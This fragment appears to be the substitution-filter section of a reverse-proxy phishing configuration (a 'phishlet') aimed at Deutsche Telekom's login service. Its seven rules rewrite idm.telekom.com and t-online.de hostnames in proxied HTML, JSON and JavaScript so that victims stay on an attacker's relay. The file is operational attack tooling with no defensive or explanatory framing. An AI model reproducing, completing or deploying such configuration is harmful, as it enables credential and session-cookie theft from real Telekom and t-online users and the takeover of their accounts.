  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "account", domain: "idm.telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "account", domain: "idm.telekom.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "www", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "www", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "email", domain: "t-online.de", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "email", domain: "t-online.de", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
  - {triggers_on: "accounts.login.idm.telekom.com", orig_sub: "idm", domain: "telekom.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "text/javascript"]}
